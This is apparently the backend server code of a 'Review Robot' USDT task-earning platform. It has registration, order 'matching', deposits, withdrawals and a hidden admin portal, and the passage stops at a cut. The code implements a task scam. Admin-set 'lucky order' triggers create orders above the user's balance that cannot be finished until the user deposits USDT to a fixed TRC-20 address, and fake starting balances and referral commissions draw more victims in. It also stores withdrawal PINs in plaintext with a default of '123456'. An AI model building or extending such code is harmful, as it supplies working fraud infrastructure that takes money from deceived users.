const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const multer = require('multer');
const QRCode = require('qrcode');

const { db } = require('./database');
const { authMiddleware, JWT_SECRET } = require('./middleware/auth');
const { adminAuthMiddleware, requireRole, ADMIN_JWT_SECRET } = require('./middleware/adminAuth');

const app = express();
const PORT = process.env.PORT || 3000;

// Setup upload directory
const uploadDir = path.join(__dirname, 'public', 'uploads');
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir, { recursive: true });
}

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, uploadDir),
  filename: (req, file, cb) => {
    const ext = path.extname(file.originalname);
    cb(null, `${Date.now()}-${Math.round(Math.random() * 1e9)}${ext}`);
  }
});
const upload = multer({ storage, limits: { fileSize: 10 * 1024 * 1024 } });

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static assets
app.use(express.static(path.join(__dirname, 'public')));

// Helper functions
function getSetting(key, defaultValue = '') {
  const row = db.prepare('SELECT value FROM system_settings WHERE key = ?').get(key);
  return row ? row.value : defaultValue;
}

function generateInviteCode() {
  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
  let code = '';
  for (let i = 0; i < 6; i++) {
    code += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return code;
}

// -------------------------------------------------------------
// PUBLIC SYSTEM CONFIG
// -------------------------------------------------------------
app.get('/api/system/public-config', (req, res) => {
  res.json({
    success: true,
    platform_name: getSetting('platform_name', 'Review Robot - xinmingzhi'),
    trc20_deposit_address: getSetting('trc20_deposit_address', 'TReaAUXRkicHL95Sangr5Bus3Fje7iq48s'),
    min_deposit: parseFloat(getSetting('min_deposit', '20')),
    min_withdraw: parseFloat(getSetting('min_withdraw', '30')),
    default_commission_rate: parseFloat(getSetting('default_commission_rate', '0.006')),
    default_daily_tasks: parseInt(getSetting('default_daily_tasks', '60'), 10),
    customer_service_url: getSetting('customer_service_url', 'https://t.me/review_robot_support'),
    customer_service_whatsapp: getSetting('customer_service_whatsapp', '+1 (555) 789-2026'),
    announcement: getSetting('announcement', 'Welcome to Review Robot platform! Complete daily product reviews to earn high USDT commissions.')
  });
});

// -------------------------------------------------------------
// AUTHENTICATION ROUTES (Register & Login)
// -------------------------------------------------------------
app.post('/api/auth/register', (req, res) => {
  try {
    const { username, password, invite_code, withdrawal_pin } = req.body;

    if (!username || !password) {
      return res.status(400).json({ success: false, message: 'Username and password are required.' });
    }

    if (username.length < 3 || username.length > 20) {
      return res.status(400).json({ success: false, message: 'Username must be between 3 and 20 characters.' });
    }

    if (password.length < 6) {
      return res.status(400).json({ success: false, message: 'Password must be at least 6 characters.' });
    }

    // Check existing username
    const existing = db.prepare('SELECT id FROM users WHERE username = ?').get(username);
    if (existing) {
      return res.status(400).json({ success: false, message: 'Username already taken. Please choose another.' });
    }

    // Process invitation code
    let validInviterCode = null;
    let startingBalance = 200.00;
    let startingVip = 1;

    if (!invite_code || !invite_code.trim()) {
      return res.status(400).json({ success: false, message: 'Invitation code is required to register.' });
    }

    const trimmedCode = invite_code.toUpperCase().trim();

    // 1. Check if it's an existing member's referral code
    const inviter = db.prepare('SELECT id, invite_code, username FROM users WHERE invite_code = ?').get(trimmedCode);
    if (inviter) {
      validInviterCode = inviter.invite_code;
    } else {
      // 2. Check if it's an active Admin-generated VIP code / token
      const adminCode = db.prepare("SELECT * FROM admin_invite_codes WHERE code = ? AND status = 'active'").get(trimmedCode);
      if (adminCode) {
        validInviterCode = 'admin';
        startingBalance = adminCode.bonus_balance || 200.00;
        startingVip = adminCode.vip_level || 1;

        const newUses = adminCode.used_count + 1;
        let newStatus = 'active';
        if (adminCode.max_uses > 0 && newUses >= adminCode.max_uses) {
          newStatus = 'exhausted';
        }
        db.prepare('UPDATE admin_invite_codes SET used_count = ?, status = ? WHERE id = ?').run(newUses, newStatus, adminCode.id);
      } else {
        return res.status(400).json({
          success: false,
          message: 'Invalid invitation code. Please check your referral code or enter a valid VIP invite code.'
        });
      }
    }

    // Generate unique invite code for this new user
    let newCode;
    let codeExists = true;
    while (codeExists) {
      newCode = generateInviteCode();
      const check = db.prepare('SELECT id FROM users WHERE invite_code = ?').get(newCode);
      if (!check) codeExists = false;
    }

    const salt = bcrypt.genSaltSync(10);
    const passwordHash = bcrypt.hashSync(password, salt);
    const pin = withdrawal_pin && withdrawal_pin.length >= 4 ? withdrawal_pin : '123456';
    const now = new Date().toISOString();

    const insertUser = db.prepare(`
      INSERT INTO users (username, password_hash, withdrawal_pin, invite_code, invited_by, balance, team_commission_unclaimed, completed_tasks, max_daily_tasks, vip_level, trc20_address, created_at)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertUser.run(username, passwordHash, pin, newCode, validInviterCode, startingBalance, 0.00, 0, 60, startingVip, '', now);

    const user = db.prepare('SELECT id, username, invite_code, invited_by, balance, frozen_balance, team_commission_unclaimed, completed_tasks, max_daily_tasks, vip_level, trc20_address, status FROM users WHERE username = ?').get(username);

    const token = jwt.sign({ id: user.id, username: user.username }, JWT_SECRET, { expiresIn: '7d' });

    res.json({
      success: true,
      message: 'Registration successful!',
      token,
      user
    });
  } catch (err) {
    console.error('Register error:', err);
    res.status(500).json({ success: false, message: 'Registration failed due to internal error.' });
  }
});

app.post('/api/auth/login', (req, res) => {
  try {
    const { username, password } = req.body;
    if (!username || !password) {
      return res.status(400).json({ success: false, message: 'Username and password required.' });
    }

    const user = db.prepare('SELECT * FROM users WHERE username = ?').get(username);
    if (!user) {
      return res.status(400).json({ success: false, message: 'Invalid username or password.' });
    }

    const valid = bcrypt.compareSync(password, user.password_hash);
    if (!valid) {
      return res.status(400).json({ success: false, message: 'Invalid username or password.' });
    }

    if (user.status === 'suspended') {
      return res.status(403).json({ success: false, message: 'Your account has been frozen. Please contact customer service.' });
    }

    const token = jwt.sign({ id: user.id, username: user.username }, JWT_SECRET, { expiresIn: '7d' });

    const safeUser = {
      id: user.id,
      username: user.username,
      invite_code: user.invite_code,
      invited_by: user.invited_by,
      balance: user.balance,
      frozen_balance: user.frozen_balance,
      team_commission_unclaimed: user.team_commission_unclaimed,
      completed_tasks: user.completed_tasks,
      max_daily_tasks: user.max_daily_tasks,
      vip_level: user.vip_level,
      trc20_address: user.trc20_address,
      status: user.status
    };

    res.json({
      success: true,
      message: 'Login successful!',
      token,
      user: safeUser
    });
  } catch (err) {
    console.error('Login error:', err);
    res.status(500).json({ success: false, message: 'Login failed due to internal error.' });
  }
});

app.get('/api/user/profile', authMiddleware, (req, res) => {
  const user = db.prepare('SELECT id, username, invite_code, invited_by, balance, frozen_balance, team_commission_unclaimed, completed_tasks, max_daily_tasks, vip_level, trc20_address, status FROM users WHERE id = ?').get(req.user.id);
  res.json({ success: true, user });
});

app.post('/api/user/update-trc20', authMiddleware, (req, res) => {
  const { trc20_address } = req.body;
  if (!trc20_address || trc20_address.trim().length < 20) {
    return res.status(400).json({ success: false, message: 'Please provide a valid TRC-20 USDT address.' });
  }

  db.prepare('UPDATE users SET trc20_address = ? WHERE id = ?').run(trc20_address.trim(), req.user.id);
  res.json({ success: true, message: 'TRC-20 address updated successfully!' });
});

app.post('/api/user/change-password', authMiddleware, (req, res) => {
  const { old_password, new_password, new_pin } = req.body;
  const user = db.prepare('SELECT * FROM users WHERE id = ?').get(req.user.id);

  if (new_password) {
    if (!bcrypt.compareSync(old_password, user.password_hash)) {
      return res.status(400).json({ success: false, message: 'Incorrect current password.' });
    }
    const hash = bcrypt.hashSync(new_password, 10);
    db.prepare('UPDATE users SET password_hash = ? WHERE id = ?').run(hash, req.user.id);
  }

  if (new_pin) {
    db.prepare('UPDATE users SET withdrawal_pin = ? WHERE id = ?').run(new_pin, req.user.id);
  }

  res.json({ success: true, message: 'Security credentials updated successfully!' });
});

// -------------------------------------------------------------
// TRADE & ORDER MATCHING ENGINE (As shown in Videos 1 & 2)
// -------------------------------------------------------------
app.get('/api/trade/status', authMiddleware, (req, res) => {
  const user = db.prepare('SELECT id, balance, frozen_balance, completed_tasks, max_daily_tasks FROM users WHERE id = ?').get(req.user.id);
  
  // Check if user has an unfinished / unprepared order
  const pendingOrder = db.prepare('SELECT * FROM orders WHERE user_id = ? AND status = ? ORDER BY id DESC LIMIT 1').get(user.id, 'unprepared');

  res.json({
    success: true,
    balance: user.balance,
    frozen_balance: user.frozen_balance,
    completed_tasks: user.completed_tasks,
    total_task: user.max_daily_tasks,
    expected_rate: '0.6%',
    has_unprepared_order: !!pendingOrder,
    unprepared_order: pendingOrder || null
  });
});

app.post('/api/trade/start-matching', authMiddleware, (req, res) => {
  try {
    const user = db.prepare('SELECT * FROM users WHERE id = ?').get(req.user.id);

    // 0. Check if tasks are allowed by administrator
    if (user.tasks_allowed === 0) {
      return res.json({
        success: false,
        code: 'TASKS_NOT_ALLOWED',
        message: 'Task matching is currently paused for your account. Please contact customer support or await administrator approval to start tasks.'
      });
    }

    // 1. Check for unfinished unprepared order
    const pendingOrder = db.prepare('SELECT * FROM orders WHERE user_id = ? AND status = ? ORDER BY id DESC LIMIT 1').get(user.id, 'unprepared');
    if (pendingOrder) {
      return res.json({
        success: false,
        code: 'UNFINISHED_ORDER',
        message: 'You still have unfinished orders, whether to jump to the unprepared order page',
        order: pendingOrder
      });
    }

    // 2. Check if daily tasks quota reached
    if (user.completed_tasks >= user.max_daily_tasks) {
      return res.status(400).json({
        success: false,
        code: 'QUOTA_REACHED',
        message: `Today's task quota (${user.max_daily_tasks}/${user.max_daily_tasks}) has been reached. Please come back tomorrow!`
      });
    }

    // 3. Check for configured Lucky Order trigger
    const nextTaskNumber = user.completed_tasks + 1;
    const trigger = db.prepare(`
      SELECT * FROM lucky_order_triggers 
      WHERE user_id = ? AND is_active = 1 
      AND (trigger_type = 'next' OR (trigger_type = 'task_number' AND target_task_number <= ?))
      ORDER BY id ASC LIMIT 1
    `).get(user.id, nextTaskNumber);

    const nowFormatted = new Date().toISOString().replace('T', ' ').slice(0, 19);

    if (trigger) {
      const orderAmount = trigger.amount;
      const expectedReturn = trigger.expected_return;
      const diff = Math.max(0, +(orderAmount - user.balance).toFixed(2));

      // Mark trigger as used
      db.prepare('UPDATE lucky_order_triggers SET is_active = 0 WHERE id = ?').run(trigger.id);

      // Generate order number
      const orderNo = 'LK' + Date.now() + Math.floor(Math.random() * 899 + 100);

      // Create order record with status 'unprepared'
      const insertOrder = db.prepare(`
        INSERT INTO orders (order_no, user_id, product_id, product_name, product_image, amount, commission, status, is_lucky_order, difference_amount, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, 1, ?, ?)
      `);
      insertOrder.run(
        orderNo,
        user.id,
        0,
        trigger.product_name || 'VIP Combination Smart Order Bundle',
        trigger.product_image || 'https://images.unsplash.com/photo-1558002038-1055907df827?w=300&auto=format&fit=crop&q=80',
        orderAmount,
        expectedReturn,
        'unprepared',
        diff,
        nowFormatted
      );

      const createdOrder = db.prepare('SELECT * FROM orders WHERE order_no = ?').get(orderNo);

      return res.json({
        success: true,
        is_lucky_order: true,
        insufficient_balance: diff > 0,
        difference: diff.toFixed(2),
        order: {
          id: createdOrder.id,
          order_no: createdOrder.order_no,
          product_name: createdOrder.product_name,
          product_image: createdOrder.product_image,
          amount: orderAmount.toFixed(2),
          expected_return: expectedReturn.toFixed(2),
          transaction_hour: nowFormatted
        }
      });
    }

    // 4. Normal Order Matching
    // Pick products around user's balance
    const products = db.prepare('SELECT * FROM products ORDER BY RANDOM() LIMIT 1').all();
    let product = products[0];

    // If product price exceeds balance by too much, scale or use default
    if (!product) {
      product = {
        id: 1,
        name: 'AutoCAD Electrical for Electrical and Automation Engineers',
        price: 199.99,
        commission_rate: 0.006,
        image_url: 'https://images.unsplash.com/photo-1581092160607-ee22621dd758?w=300&auto=format&fit=crop&q=80'
      };
    }

    // Calculate expected return
    const rate = product.commission_rate || 0.006;
    const expectedReturn = +(product.price * rate).toFixed(2);

    return res.json({
      success: true,
      is_lucky_order: false,
      product: {
        id: product.id,
        name: product.name,
        price: product.price.toFixed(2),
        expected_return: expectedReturn.toFixed(2),
        image_url: product.image_url,
        transaction_hour: nowFormatted
      }
    });

  } catch (err) {
    console.error('Matching error:', err);
    res.status(500).json({ success: false, message: 'Matching failed. Please try again.' });
  }
});

app.post('/api/trade/submit-order', authMiddleware, (req, res) => {
  try {
    const { product_id, product_name, product_image, amount, expected_return } = req.body;
    const user = db.prepare('SELECT * FROM users WHERE id = ?').get(req.user.id);

    if (user.completed_tasks >= user.max_daily_tasks) {
      return res.status(400).json({ success: false, message: 'Daily tasks already finished.' });
    }

    const commissionVal = parseFloat(expected_return) || 0;
    const orderAmt = parseFloat(amount) || 0;
    const nowFormatted = new Date().toISOString().replace('T', ' ').slice(0, 19);
    const orderNo = 'ORD' + Date.now() + Math.floor(Math.random() * 899 + 100);

    // Record completed order
    db.prepare(`
      INSERT INTO orders (order_no, user_id, product_id, product_name, product_image, amount, commission, status, is_lucky_order, difference_amount, created_at, completed_at)
      VALUES (?, ?, ?, ?, ?, ?, ?, 'completed', 0, 0, ?, ?)
    `).run(orderNo, user.id, product_id || 0, product_name, product_image || '', orderAmt, commissionVal, nowFormatted, nowFormatted);

    // Update user balance & completed tasks
    const newBalance = +(user.balance + commissionVal).toFixed(2);
    const newCompleted = user.completed_tasks + 1;

    db.prepare('UPDATE users SET balance = ?, completed_tasks = ? WHERE id = ?').run(newBalance, newCompleted, user.id);

    // Referral commission distribution (Level 1)
    if (user.invited_by) {
      const inviter = db.prepare('SELECT id, team_commission_unclaimed FROM users WHERE invite_code = ?').get(user.invited_by);
      if (inviter) {
        const l1Rate = parseFloat(getSetting('referral_commission_l1', '0.16'));
        const l1Commission = +(commissionVal * l1Rate).toFixed(2);
        if (l1Commission > 0) {
          db.prepare('UPDATE users SET team_commission_unclaimed = team_commission_unclaimed + ? WHERE id = ?').run(l1Commission, inviter.id);
        }
      }
    }

    // Partner 2-Account Team 10% Bonus on 60 Tasks Completion
    if (newCompleted >= user.max_daily_tasks && user.bound_partner_id) {
      const partner = db.prepare('SELECT id, username FROM users WHERE id = ?').get(user.bound_partner_id);
      if (partner) {
        const cycleProfit = +(user.cycle_profit || user.max_profit || 10.00);
        const partnerBonus = +(cycleProfit * 0.10).toFixed(2);
        if (partnerBonus > 0) {
          db.prepare('UPDATE users SET team_commission_unclaimed = team_commission_unclaimed + ? WHERE id = ?').run(partnerBonus, partner.id);
          const rewOrderNo = 'REW' + Date.now() + Math.floor(Math.random() * 899 + 100);
          db.prepare(`
            INSERT INTO orders (order_no, user_id, product_id, product_name, product_image, amount, commission, status, is_lucky_order, difference_amount, created_at, completed_at)
            VALUES (?, ?, 0, ?, '', 0, ?, 'completed', 0, 0, ?, ?)
          `).run(rewOrderNo, partner.id, `Partner Team 10% Profit Bonus (Partner ${user.username} completed ${user.max_daily_tasks} tasks)`, partnerBonus, nowFormatted, nowFormatted);
        }
      }
    }

    res.json({
      success: true,
      message: 'Successful operation',
      new_balance: newBalance,
      completed_tasks: newCompleted,
      total_task: user.max_daily_tasks
    });
  } catch (err) {
    console.error('Submit order error:', err);
    res.status(500).json({ success: false, message: 'Order submission failed.' });
  }
});

// Complete Unprepared Lucky Order once balance is replenished
app.post('/api/trade/complete-unprepared-order', authMiddleware, (req, res) => {
  try {
    const { order_id } = req.body;
    const user = db.prepare('SELECT * FROM users WHERE id = ?').get(req.user.id);
    const order = db.prepare('SELECT * FROM orders WHERE id = ? AND user_id = ? AND status = ?').get(order_id, user.id, 'unprepared');

    if (!order) {
      return res.status(404).json({ success: false, message: 'Unprepared order not found.' });
    }

    // Check if balance covers order amount
    if (user.balance < order.amount) {
      const diff = +(order.amount - user.balance).toFixed(2);
      return res.status(400).json({
        success: false,
        code: 'INSUFFICIENT_BALANCE',
        difference: diff,
        message: `Insufficient balance! You need ${diff} USDT more to complete this order.`
      });
    }

    const nowFormatted = new Date().toISOString().replace('T', ' ').slice(0, 19);
    const newBalance = +(user.balance + order.commission).toFixed(2);
    const newCompleted = user.completed_tasks + 1;

    // Mark order completed
    db.prepare('UPDATE orders SET status = ?, difference_amount = 0, completed_at = ? WHERE id = ?').run('completed', nowFormatted, order.id);

    // Update user balance & completed tasks
    db.prepare('UPDATE users SET balance = ?, completed_tasks = ? WHERE id = ?').run(newBalance, newCompleted, user.id);

    res.json({
      success: true,
      message: 'Successful operation',
      new_balance: newBalance,
      completed_tasks: newCompleted
    });
  } catch (err) {
    console.error('Complete unprepared order error:', err);
    res.status(500).json({ success: false, message: 'Failed to complete order.' });
  }
});

// -------------------------------------------------------------
// TEAM & REFERRAL COMMISSION (As shown in Video 1)
// -------------------------------------------------------------
app.get('/api/team/info', authMiddleware, (req, res) => {
  const user = db.prepare('SELECT id, balance, invite_code, team_commission_unclaimed FROM users WHERE id = ?').get(req.user.id);
  
  // Find members invited by this user
  const subordinates = db.prepare(`
    SELECT username, balance, completed_tasks, created_at, status 
    FROM users 
    WHERE invited_by = ?
    ORDER BY id DESC
  `).all(user.invite_code);

  // Compute contribution stats
  const teamList = subordinates.map(sub => ({
    username: sub.username,
    contributions: +(sub.completed_tasks * 0.75).toFixed(2),
    state: sub.status === 'active' ? 'Open up' : 'Frozen',
    created_at: sub.created_at
  }));

  res.json({
    success: true,
    balance: user.balance,
    commission: user.team_commission_unclaimed,
    invite_code: user.invite_code,
    total_people: subordinates.length,
    team: teamList
  });
});

app.post(['/api/team/claim-commission', '/api/team/receive-commission'], authMiddleware, (req, res) => {
  const user = db.prepare('SELECT id, balance, team_commission_unclaimed FROM users WHERE id = ?').get(req.user.id);

  if (!user.team_commission_unclaimed || user.team_commission_unclaimed <= 0) {
    return res.status(400).json({ success: false, message: 'No commission available to receive.' });
  }

  const claimAmt = user.team_commission_unclaimed;
  const newBalance = +(user.balance + claimAmt).toFixed(2);

  db.prepare('UPDATE users SET balance = ?, team_commission_unclaimed = 0.00 WHERE id = ?').run(newBalance, user.id);

  res.json({
    success: true,
    message: 'Successful operation',
    claimed_amount: claimAmt,
    new_balance: newBalance,
    new_commission: 0.00
  });
});

// -------------------------------------------------------------
// RECHARGE (DEPOSIT USDT TRC-20) (As shown in Video 2)
// -------------------------------------------------------------
app.get('/api/recharge/info', authMiddleware, async (req, res) => {
  try {
    const address = getSetting('trc20_deposit_address', 'TReaAUXRkicHL95Sangr5Bus3Fje7iq48s');
    const qrDataUrl = await QRCode.toDataURL(address, { width: 220, margin: 1 });
    res.json({
      success: true,
      method: 'TRC-20',
      deposit_address: address,
      qr_code: qrDataUrl,
      min_deposit: parseFloat(getSetting('min_deposit', '20')),
      instruction: 'The deposit address only supports TRC20-USDT, and the minimum deposit amount is 20USDT'
    });
  } catch (err) {
    res.json({
      success: true,
      method: 'TRC-20',
      deposit_address: getSetting('trc20_deposit_address', 'TReaAUXRkicHL95Sangr5Bus3Fje7iq48s'),
      min_deposit: parseFloat(getSetting('min_deposit', '20')),
      instruction: 'The deposit address only supports TRC20-USDT, and the minimum deposit amount is 20USDT'
    });
  }
});

app.post('/api/recharge/submit', authMiddleware, upload.single('proof'), (req, res) => {
  try {
    const { amount, txid } = req.body;
    const depositAmt = parseFloat(amount);
    const minDep = parseFloat(getSetting('min_deposit', '20'));

    if (!depositAmt || depositAmt < minDep) {
      return res.status(400).json({ success: false, message: `Minimum deposit amount is ${minDep} USDT.` });
    }

    const proofPath = req.file ? `/uploads/${req.file.filename}` : '';
    const now = new Date().toISOString();

    db.prepare(`
      INSERT INTO recharges (user_id, amount, payment_method, txid, proof_image, status, created_at)
      VALUES (?, ?, 'TRC20-USDT', ?, ?, 'pending', ?)
    `).run(req.user.id, depositAmt, txid || '', proofPath, now);

    res.json({
      success: true,
      message: 'Deposit voucher submitted! Our blockchain audit system is processing your transaction.'
    });
  } catch (err) {
    console.error('Recharge submit error:', err);
    res.status(500).json({ success: false, message: 'Submission failed.' });
  }
});

app.get('/api/recharge/records', authMiddleware, (req, res) => {
  const records = db.prepare('SELECT * FROM recharges WHERE user_id = ? ORDER BY id DESC').all(req.user.id);
  res.json({ success: true, records });
});

// -------------------------------------------------------------
// WITHDRAWALS
// -------------------------------------------------------------
app.post('/api/withdraw/submit', authMiddleware, (req, res) => {
  try {
    const { amount, trc20_address, withdrawal_pin } = req.body;
    const withdrawAmt = parseFloat(amount);
    const minWithdraw = parseFloat(getSetting('min_withdraw', '30'));

    const user = db.prepare('SELECT * FROM users WHERE id = ?').get(req.user.id);

    if (!withdrawAmt || withdrawAmt < minWithdraw) {
      return res.status(400).json({ success: false, message: `Minimum withdrawal amount is ${minWithdraw} USDT.` });
    }

    if (withdrawAmt > user.balance) {
      return res.status(400).json({ success: false, message: 'Insufficient available balance.' });
    }

    if (user.withdrawal_pin && user.withdrawal_pin !== withdrawal_pin) {
      return res.status(400).json({ success: false, message: 'Incorrect withdrawal PIN.' });
    }

    const addr = trc20_address || user.trc20_address;
    if (!addr || addr.length < 20) {
      return res.status(400).json({ success: false, message: 'Please provide a valid TRC-20 withdrawal address.' });
    }

    const fee = 0.00;
    const actual = +(withdrawAmt - fee).toFixed(2);
    const now = new Date().toISOString();

    // Deduct available balance, add to frozen balance
    const newBal = +(user.balance - withdrawAmt).toFixed(2);
    const newFrozen = +(user.frozen_balance + withdrawAmt).toFixed(2);

    db.prepare('UPDATE users SET balance = ?, frozen_balance = ? WHERE id = ?').run(newBal, newFrozen, user.id);

    db.prepare(`
      INSERT INTO withdrawals (user_id, amount, trc20_address, fee, actual_amount, status, created_at)
      VALUES (?, ?, ?, ?, ?, 'pending', ?)
    `).run(user.id, withdrawAmt, addr, fee, actual, now);

    res.json({
      success: true,
      message: 'Withdrawal request submitted! Processing typically completes within 10-30 minutes.'
    });
  } catch (err) {
    console.error('Withdraw submit error:', err);
    res.status(500).json({ success: false, message: 'Withdrawal request failed.' });
  }
});

app.get('/api/withdraw/records', authMiddleware, (req, res) => {
  const records = db.prepare('SELECT * FROM withdrawals WHERE user_id = ? ORDER BY id DESC').all(req.user.id);
  res.json({ success: true, records });
});

// -------------------------------------------------------------
// ORDERS RECORD
// -------------------------------------------------------------
app.get('/api/orders', authMiddleware, (req, res) => {
  const { status } = req.query;
  let query = 'SELECT * FROM orders WHERE user_id = ?';
  const params = [req.user.id];

  if (status && status !== 'all') {
    query += ' AND status = ?';
    params.push(status);
  }

  query += ' ORDER BY id DESC';
  const orders = db.prepare(query).all(...params);
  res.json({ success: true, orders });
});

// =============================================================
// HIDDEN ADMIN PORTAL API (Full Control, Not Publicly Accessible)
// =============================================================

// Admin Login
app.post('/api/admin/login', (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) {
    return res.status(400).json({ success: false, message: 'Admin username and password required.' });
  }

  const admin = db.prepare('SELECT * FROM admins WHERE username = ?').get(username);
  if (!admin || !bcrypt.compareSync(password, admin.password_hash)) {
    return res.status(401).json({ success: false, message: 'Invalid admin credentials.' });
  }

  const role = admin.role || 'superadmin';
  const token = jwt.sign({ id: admin.id, username: admin.username, role: role }, ADMIN_JWT_SECRET, { expiresIn: '24h' });

  res.json({
    success: true,
    message: 'Admin authorization granted.',
    token,
    admin: { id: admin.id, username: admin.username, role: role }
  });
});

// Admin Dashboard Summary
app.get('/api/admin/dashboard-stats', adminAuthMiddleware, (req, res) => {
  const totalUsers = db.prepare('SELECT COUNT(*) as count FROM users').get().count;
  const totalBalance = db.prepare('SELECT SUM(balance) as total FROM users').get().total || 0;
  const pendingRecharges = db.prepare('SELECT COUNT(*) as count FROM recharges WHERE status = ?').get('pending').count;
  const pendingWithdrawals = db.prepare('SELECT COUNT(*) as count FROM withdrawals WHERE status = ?').get('pending').count;
  const completedOrders = db.prepare('SELECT COUNT(*) as count FROM orders WHERE status = ?').get('completed').count;
  const activeLuckyOrders = db.prepare('SELECT COUNT(*) as count FROM lucky_order_triggers WHERE is_active = 1').get().count;
  const activeTokens = db.prepare("SELECT COUNT(*) as count FROM admin_invite_codes WHERE status = 'active'").get().count;

  res.json({
    success: true,
    stats: {
      total_users: totalUsers,
      total_user_balance: totalBalance.toFixed(2),
      pending_recharges: pendingRecharges,
      pending_withdrawals: pendingWithdrawals,
      completed_orders: completedOrders,
      active_lucky_triggers: activeLuckyOrders,
      active_invite_tokens: activeTokens
    }
  });
});

// Admin User Management - List all users
app.get('/api/admin/users', adminAuthMiddleware, (req, res) => {
  const users = db.prepare(`
    SELECT id, username, invite_code, invited_by, balance, frozen_balance, team_commission_unclaimed, 
           completed_tasks, max_daily_tasks, vip_level, trc20_address, status, created_at 
    FROM users 
    ORDER BY id DESC
  `).all();
  res.json({ success: true, users });
});

// Admin User Management - Add New User Manually
app.post('/api/admin/users', adminAuthMiddleware, requireRole('superadmin', 'manager'), (req, res) => {
  try {
    const { username, password, balance, max_daily_tasks, vip_level, invite_code, invited_by, withdrawal_pin } = req.body;
    if (!username || !password) {
      return res.status(400).json({ success: false, message: 'Username and password are required.' });
    }

    const existing = db.prepare('SELECT id FROM users WHERE username = ?').get(username.trim());
    if (existing) {
      return res.status(400).json({ success: false, message: 'Username already taken. Please choose another.' });
    }

    let code = invite_code && invite_code.trim() ? invite_code.toUpperCase().trim() : generateInviteCode();
    while (db.prepare('SELECT id FROM users WHERE invite_code = ?').get(code) || db.prepare('SELECT id FROM admin_invite_codes WHERE code = ?').get(code)) {
      code = generateInviteCode();
    }

    const salt = bcrypt.genSaltSync(10);
    const hash = bcrypt.hashSync(password, salt);
    const pin = withdrawal_pin && withdrawal_pin.length >= 4 ? withdrawal_pin : '123456';
    const initialBal = parseFloat(balance !== undefined ? balance : 200.00);
    const dailyTasks = parseInt(max_daily_tasks || 60, 10);
    const vip = parseInt(vip_level || 1, 10);
    const now = new Date().toISOString();

    const result = db.prepare(`
      INSERT INTO users (username, password_hash, withdrawal_pin, invite_code, invited_by, balance, team_commission_unclaimed, completed_tasks, max_daily_tasks, vip_level, trc20_address, created_at)
      VALUES (?, ?, ?, ?, ?, ?, 0.00, 0, ?, ?, '', ?)
    `).run(username.trim(), hash, pin, code, invited_by ? invited_by.trim() : null, initialBal, dailyTasks, vip, now);

    res.json({
      success: true,
      message: `User ${username} added successfully with starting balance ${initialBal} USDT and code ${code}!`,
      user: {
        id: Number(result.lastInsertRowid),
        username: username.trim(),
        balance: initialBal,
        invite_code: code,
        vip_level: vip
      }
    });
  } catch (err) {
    console.error('Admin add user error:', err);
    res.status(500).json({ success: false, message: 'Failed to add user.' });
  }
});

// Admin User Management - Delete User Permanently
app.delete('/api/admin/users/:id', adminAuthMiddleware, requireRole('superadmin'), (req, res) => {
  try {
    const user = db.prepare('SELECT id, username FROM users WHERE id = ?').get(req.params.id);
    if (!user) return res.status(404).json({ success: false, message: 'User not found.' });

    // Cascade delete user data
    db.prepare('DELETE FROM orders WHERE user_id = ?').run(user.id);
    db.prepare('DELETE FROM lucky_order_triggers WHERE user_id = ?').run(user.id);
    db.prepare('DELETE FROM recharges WHERE user_id = ?').run(user.id);
    db.prepare('DELETE FROM withdrawals WHERE user_id = ?').run(user.id);
    db.prepare('DELETE FROM users WHERE id = ?').run(user.id);

    res.json({
      success: true,
      message: `User ${user.username} (ID #${user.id}) and all associated records have been permanently removed.`
    });
  } catch (err) {
    console.error('Admin delete user error:', err);
    res.status(500).json({ success: false, message: 'Failed to delete user.' });
  }
});

// =============================================================
// ADMIN INVITATION CODES & TOKENS GENERATOR
// =============================================================
app.get('/api/admin/invite-codes', adminAuthMiddleware, requireRole('superadmin', 'manager'), (req, res) => {
  const codes = db.prepare('SELECT * FROM admin_invite_codes ORDER BY id DESC').all();
  res.json({ success: true, codes });
});

app.post('/api/admin/invite-codes/generate', adminAuthMiddleware, requireRole('superadmin', 'manager'), (req, res) => {
  try {
    const { custom_code, code: directCode, count, bonus_balance, max_uses, vip_level } = req.body;
    const targetCustomCode = (custom_code || directCode || '').toString().trim();
    const bonus = parseFloat(bonus_balance !== undefined ? bonus_balance : 200.00);
    const uses = parseInt(max_uses !== undefined ? max_uses : 1, 10);
    const vip = parseInt(vip_level || 1, 10);
    const now = new Date().toISOString();

    const insertCode = db.prepare(`
      INSERT INTO admin_invite_codes (code, bonus_balance, max_uses, used_count, vip_level, status, created_by, created_at)
      VALUES (?, ?, ?, 0, ?, 'active', ?, ?)
    `);

    if (targetCustomCode) {
      const code = targetCustomCode.toUpperCase();
      const existing = db.prepare('SELECT id FROM admin_invite_codes WHERE code = ?').get(code) ||
                       db.prepare('SELECT id FROM users WHERE invite_code = ?').get(code);
      if (existing) {
        return res.status(400).json({ success: false, message: `Code "${code}" already exists. Please choose another.` });
      }
      insertCode.run(code, bonus, uses, vip, req.admin.username, now);
      return res.json({ success: true, message: `Custom VIP Code ${code} created successfully!`, codes: [code] });
    } else {
      const qty = Math.min(50, Math.max(1, parseInt(count || 1, 10)));
      const generated = [];
      for (let i = 0; i < qty; i++) {
        let code = generateInviteCode();
        while (db.prepare('SELECT id FROM admin_invite_codes WHERE code = ?').get(code) || db.prepare('SELECT id FROM users WHERE invite_code = ?').get(code)) {
          code = generateInviteCode();
        }
        insertCode.run(code, bonus, uses, vip, req.admin.username, now);
        generated.push(code);
      }
      return res.json({ success: true, message: `Generated ${generated.length} VIP token code(s)!`, codes: generated });
    }
  } catch (err) {
    console.error('Generate code error:', err);
    res.status(500).json({ success: false, message: 'Failed to generate codes.' });
  }
});

app.delete('/api/admin/invite-codes/:id', adminAuthMiddleware, requireRole('superadmin', 'manager'), (req, res) => {
  db.prepare('DELETE FROM admin_invite_codes WHERE id = ?').run(req.params.id);
  res.json({ success: true, message: 'Invite token deleted successfully.' });
});

// =============================================================
// ADMIN TEAM & RBAC MANAGEMENT
